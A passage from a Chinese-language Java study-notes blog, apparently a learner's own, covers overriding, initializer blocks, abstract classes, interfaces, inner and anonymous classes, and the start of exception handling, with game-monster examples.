class="hljs-type">int</span> <span class="hljs-title function_">suml</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i + <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getl</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i;<br>        &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br><span class="hljs-comment">//        @Override</span><br><span class="hljs-comment">//        public int sum()&#123;</span><br><span class="hljs-comment">//                return i + 20;</span><br><span class="hljs-comment">//        &#125;</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getl</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i;<br>        &#125;<br><span class="hljs-comment">//        @Override</span><br><span class="hljs-comment">//        public int suml()&#123;</span><br><span class="hljs-comment">//                return i + 10;</span><br><span class="hljs-comment">//        &#125;</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>B类中将<code>sum()</code>和<code>suml()</code>方法重写给注释掉了，因此会调用父类A类中的sum和suml方法，i也调用A类中的，所以输出30 20</p><p>代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//(1) 下面的三个构造器都有相同的语句</span><br><span class="hljs-comment">//(2) 这样代码看起来比较冗余</span><br><span class="hljs-comment">//(3) 这时我们可以把相同的语句，放入到一个代码块中，即可</span><br><span class="hljs-comment">//(4) 这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容</span><br><span class="hljs-comment">//(5) 代码块调用的顺序优先于构造器.. </span><br><span class="hljs-comment">//(6) 代码块只能用static修饰，static 代码块，是在类加载时，执行的，而且只会执行一次</span><br><span class="hljs-comment">//(7) 普通的代码块，在创建对象实例时，会被隐式的调用</span><br>&#123;<br>System.out.println(<span class="hljs-string">&quot;电影屏幕打开...&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;广告开始...&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;电影正是开始...&quot;</span>);<br>&#125;;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Movie</span><span class="hljs-params">(String name)</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;Movie(String name) 被调用...&quot;</span>);<br><span class="hljs-built_in">this</span>.name = name;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Movie</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> price)</span> &#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.price = price;<br>&#125;<br></code></pre></td></tr></table></figure><p>抽象类：当父类的某些方法需要声明但是又不知道如何实现时，可将其声明为抽象方法，其所在类被称为抽象类，用<code>abstract</code>关键字修饰</p><ol><li>抽象类用abstract关键词修饰</li><li>用abstract关键词修饰方法，该方法就是抽象方法，不能含有方法主体</li><li>抽象类不能被实例化</li><li>抽象类不一定要包含抽象方法，但是抽象方法所在类一定要被声明为抽象类</li><li>abstract只能修饰类和方法</li><li>抽象方法不能使用private，final，static来修饰</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Zombie</span> <span class="hljs-variable">zo1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Zombie</span>();<br>                <span class="hljs-type">Crepper</span> <span class="hljs-variable">crep1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crepper</span>();<br>                zo1.run();<br>                zo1.attack();<br>                crep1.run();<br>                crep1.attack();<br><br><br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">monster</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;&#125;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;&#125;;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Zombie</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在攻击&quot;</span>);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在跑&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crepper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕炸了&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕在追你！&quot;</span>);<br>        &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230913202811559.png"></p><p><img src="/2023/04/24/java-note/image-20230913202827061.png"></p><p><img src="/2023/04/24/java-note/image-20230913202858252.png"></p><p><img src="/2023/04/24/java-note/image-20230913202913840.png"></p><p><img src="/2023/04/24/java-note/image-20230913202945833.png"></p><p><img src="/2023/04/24/java-note/image-20230913203027412.png"></p><p><img src="/2023/04/24/java-note/image-20230913203122019.png"></p><p>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Zombie</span> <span class="hljs-variable">zo1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Zombie</span>();<br>                <span class="hljs-type">Crepper</span> <span class="hljs-variable">crep1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crepper</span>();<br>                zo1.run();<br>                zo1.attack();<br>                crep1.run();<br>                crep1.attack();<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">monster</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>;<span class="hljs-comment">//接口的方法不能有方法体</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Zombie</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在攻击&quot;</span>);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在跑&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crepper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕炸了&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕在追你！&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230913210930011.png"></p><p>应用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DBInterface</span> &#123; <span class="hljs-comment">//项目经理</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span>;<span class="hljs-comment">//连接方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>;<span class="hljs-comment">//关闭连接</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DBInterface</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//连接mysql</span><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//断开mysql</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DBInterface</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//连接oracle</span><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//断开Oracle</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-number">1</span>.接口不能被实例化<br><span class="hljs-regexp">//</span><span class="hljs-number">2</span>.接口中所有的方法是 public 方法, 接口中抽象方法，可以不用 abstract 修饰<br><span class="hljs-regexp">//</span><span class="hljs-number">3</span>.一个普通类实现接口,就必须将该接口的所有方法都实现,可以使用 alt+enter 来解决<br><span class="hljs-regexp">//</span><span class="hljs-number">4</span>.抽象类去实现接口时，可以不实现接口的抽象方法<br><span class="hljs-regexp">//</span><span class="hljs-number">5</span>.接口可以继承其他接口<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230913211935707.png"></p><p><strong>内部类：</strong></p><p>内部类可以直接访问私有属性，定义在外部类局部：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Monster</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Monster</span>();<br>                m.method();<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monster</span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">attackValue</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">privateMethod</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;这是Monster的私有方法&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Behavior</span>&#123;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                        System.out.println(<span class="hljs-string">&quot;僵尸对你造成了&quot;</span>+attackValue+<span class="hljs-string">&quot;伤害&quot;</span>);<span class="hljs-comment">//可以换为Monster.this.attackValue</span><br>                        privateMethod();<span class="hljs-comment">//内部类访问外部类对象时直接访问，</span><br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;666&quot;</span>);<br><br>                <span class="hljs-type">Behavior</span> <span class="hljs-variable">be</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Behavior</span>();<span class="hljs-comment">//外部类访问内部类属性时要创建类对象</span><br>                be.attack();<span class="hljs-comment">//外部类在方法中，可以创建 be 对象，然后调用方法即可</span><br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>当然亦可以定义在外部类方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Monster</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Monster</span>();<br>                m.method();<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monster</span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">attackValue</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">privateMethod</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;这是Monster的私有方法&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">class</span> <span class="hljs-title class_">Behavior</span>&#123;<br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                                System.out.println(<span class="hljs-string">&quot;僵尸对你造成了&quot;</span>+Monster.<span class="hljs-built_in">this</span>.attackValue+<span class="hljs-string">&quot;伤害&quot;</span>);<br>                                privateMethod();<br>                        &#125;<br>                &#125;<br>                <span class="hljs-type">Behavior</span> <span class="hljs-variable">be</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Behavior</span>();<br>                be.attack();<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230914143800027.png"></p><p><img src="/2023/04/24/java-note/image-20230914143909131.png"></p><p><img src="/2023/04/24/java-note/image-20230914143925791.png"></p><p>匿名内部类：</p><ol><li><strong>没有类名</strong>：匿名类没有类名，它是在创建实例的同时定义类的一种方式。</li><li><strong>直接在代码中定义</strong>：匿名类通常在创建对象的位置直接定义，通常是作为接口的实现或父类的扩展。</li><li><strong>只能继承一个类或实现一个接口</strong>：一个匿名类可以继承一个类，或者实现一个接口，但不能同时做两者。</li><li><strong>可以访问外部的变量</strong>：匿名类可以访问其外部作用域中的变量，但是这些变量必须是 <code>final</code> 或者事实上是 <code>final</code> 的（也就是说不能在匿名类中对它们进行修改）。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">greet</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Greeting</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">greet</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Hello!&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        greeting.greet(); <span class="hljs-comment">// 输出 &quot;Hello!&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>匿名类在方法中作为参数，高效：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Zombie</span> <span class="hljs-variable">zo1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Zombie</span>();<br>                <span class="hljs-type">Crepper</span> <span class="hljs-variable">crep1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crepper</span>();<br>                zo1.run();<br>                zo1.attack();<br>                crep1.run();<br>                crep1.attack();<br>                <span class="hljs-type">monster</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">monster</span>() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span> &#123;<br>                                System.out.println(<span class="hljs-string">&quot;1&quot;</span>);<br>                        &#125;<br><br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                                System.out.println(<span class="hljs-string">&quot;1&quot;</span>);<br>                        &#125;<br>                &#125;;<br><span class="hljs-comment">//                aa.run();</span><br>                func(<span class="hljs-keyword">new</span> <span class="hljs-title class_">monster</span>()&#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                                System.out.println(<span class="hljs-string">&quot;改写attack&quot;</span>);<br>                        &#125;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                                System.out.println(<span class="hljs-string">&quot;改写run&quot;</span>);<br>                        &#125;<br>                &#125;);<span class="hljs-comment">//直接当函数参数使用</span><br>                func(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Zombie</span>());<span class="hljs-comment">//传统方法调用</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">(monster m)</span>&#123;<br>            <span class="hljs-comment">//静态方法</span><br>                m.run();<br>                m.attack();<br>                System.out.println(<span class="hljs-string">&quot;使用匿名类！&quot;</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">monster</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>;<span class="hljs-comment">//接口的方法不能有方法体</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Zombie</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在攻击&quot;</span>);<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;僵尸在跑&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Crepper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">monster</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕炸了&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;苦力怕在追你！&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        System.out.println(<span class="hljs-number">10</span>/<span class="hljs-number">0</span>);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                    System.out.println(<span 